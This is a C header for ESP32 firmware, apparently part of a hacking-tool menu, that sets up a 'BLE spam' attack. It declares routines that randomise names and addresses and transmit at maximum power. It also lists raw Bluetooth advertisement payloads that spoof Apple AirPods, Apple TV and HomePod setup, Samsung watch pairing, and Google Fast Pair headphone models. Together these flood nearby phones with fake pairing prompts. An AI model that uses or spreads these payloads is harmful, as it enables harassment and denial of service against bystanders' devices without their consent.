#ifndef BLE_SPAM_H
#define BLE_SPAM_H

#include <stdint.h>
#include <esp_log.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <esp_bt.h>
#include <esp_gap_ble_api.h>
#include <esp_bt_defs.h>
#include <esp_bt_main.h>
#include "nvs_flash.h"

#include "../../menu.h"

#ifndef ESP_PWR_LVL_P21
#define ESP_PWR_LVL_P21 ((esp_power_level_t)15) // as ESP_PWR_LVL_P21 is not defined in esp-idf v4.4 
#endif

#if CONFIG_IDF_TARGET_ESP32C3 || CONFIG_IDF_TARGET_ESP32C2 || CONFIG_IDF_TARGET_ESP32S3
#define MAX_TX_POWER ESP_PWR_LVL_P21
#elif CONFIG_IDF_TARGET_ESP32H2 || CONFIG_IDF_TARGET_ESP32C6
#define MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

typedef enum {
    DEVICE_APPLE,
    DEVICE_SAMSUNG,
    DEVICE_GOOGLE,
    DEVICE_MICROSOFT,
    DEVICE_NAME
} EBLEPayloadType;

uint32_t delayMilliseconds = 1000;
EBLEPayloadType choice;

const char* generate_random_name();
void generate_random_address(esp_bd_addr_t addr);
void send_adv(esp_ble_adv_params_t adv_params, uint8_t *raw_adv_data, size_t raw_adv_data_len);
void start_advertising(EBLEPayloadType type);
int BLESpam();

uint8_t IOS_LONG_MODELS[][31] = {
    { 0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, //Airpods
    { 0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0E, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, //AirpodsPro
    { 0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0A, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, //AirpodsMAx
    { 0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0F, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, //Airpods2
    { 0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, //Airpods3
    { 0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, //AirpodsPro2
};

#define IOS_LONG_COUNT (sizeof(IOS_LONG_MODELS) / sizeof(IOS_LONG_MODELS[0]))

uint8_t IOS_SHORT_MODELS[][25] = {
    { 0x18, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC1, 0x09, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00}, //Numbersetup
    { 0x18, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00}, //AppleTVPair
    { 0x18, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00}, //AppleTVSetup
    { 0x18, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00}, //AppleTVConfigure
    { 0x18, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00}, //HomepodSetup
};

#define IOS_SHORT_COUNT (sizeof(IOS_SHORT_MODELS) / sizeof(IOS_SHORT_MODELS[0]))

uint8_t SAMSUNG_MODELS[][15] = {
    { 0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00 }, // WatchPair
};

#define SAMSUNG_COUNT (sizeof(SAMSUNG_MODELS) / sizeof(SAMSUNG_MODELS[0]))

uint32_t GOOGLE_MODELS[] = {
    0x92BBBD, // "Pixel Buds"
    0x000006, // "Google Pixel Buds"
    0x821F66, // "JBL Flip 6"
    0xF52494, // "JBL Buds Pro"
    0x718FA4, // "JBL Live 300TWS"
    0xD446A7, // "Sony XM5"
    0xCD8256, // "Bose NC 700"
    0x0000F0, // "Bose QuietComfort 35 II"
    0x0E30C3, // "Razer Hammerhead TWS"
    0x0003F0, // "LG HBS-835S"
};

#define GOOGLE_MODEL_COUNT (sizeof(GOOGLE_MODELS) / sizeof(GOOGLE_MODELS[0]))

#endif